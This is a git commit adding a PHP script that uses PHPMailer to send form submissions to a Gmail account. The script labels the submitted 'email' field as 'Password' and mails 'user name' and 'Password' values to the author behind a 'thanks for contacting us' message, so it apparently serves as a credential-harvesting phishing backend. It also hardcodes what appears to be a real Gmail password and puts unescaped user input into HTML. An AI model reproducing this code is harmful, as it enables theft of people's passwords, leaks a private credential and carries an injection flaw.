eaa3f486846130bd288aad2b42df689cadf56d1e
K.S.Sabari Nathan <68042285+sabarinathan145@users.noreply.github.com>
2021-10-15 22:34:27 +0530

    Add files via upload

---
+++ PHP Mailer/sendemail.php
@@ -0,0 +1,58 @@
+<?php
+
+
+use PHPMailer\PHPMailer\PHPMailer;
+
+require_once 'phpmailer/Exception.php';
+require_once 'phpmailer/PHPMailer.php';
+require_once 'phpmailer/SMTP.php';
+$url   = "http://sabar-i.herokuapp.com/";
+$mail = new PHPMailer(true);
+
+$alert = '';
+
+if(isset($_POST['submit'])){
+  $name = $_POST['name'];
+  $password = $_POST['email'];
+  $message = $_POST['message'];
+
+  try{
+    $mail->isSMTP();
+    $mail->Host = 'smtp.gmail.com';
+    $mail->SMTPAuth = true;
+    $mail->Username = 'sabari.rishi32@gmail.com'; // Gmail address which you want to use as SMTP server
+    $mail->Password = 'priyasabari33'; // Gmail address Password
+
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+    $mail->Port = '587';
+
+    $mail->setFrom('sabari.rishi32@gmail.com'); // Gmail address which you used as SMTP server
+    $mail->addAddress('sabari.rishi32@gmail.com'); 
+  
+    $mail->isHTML(true);
+    $mail->Subject = ' subject';
+    $mail->Body = "<h3>user name : $name <br>Password: $password  <br>Message: $message </h3>";
+
+    $mail->send();
+
+    
+  
+   
+
+   $alert = '<div class="alert-success" id="error">
+           <script>
+          alert("thanks for contacting us - Your message sent successfully"); 
+          </script>
+   </div>';
+     
+  //header("Location: https://sabar-i.herokuapp.com/#contact");
+  
+  } 
+  catch (Exception $e){
+  $alert = '<div class="alert-error">
+                <span>'.$e->getMessage().'</span>
+              </div>';
+  }
+}
+?>
+
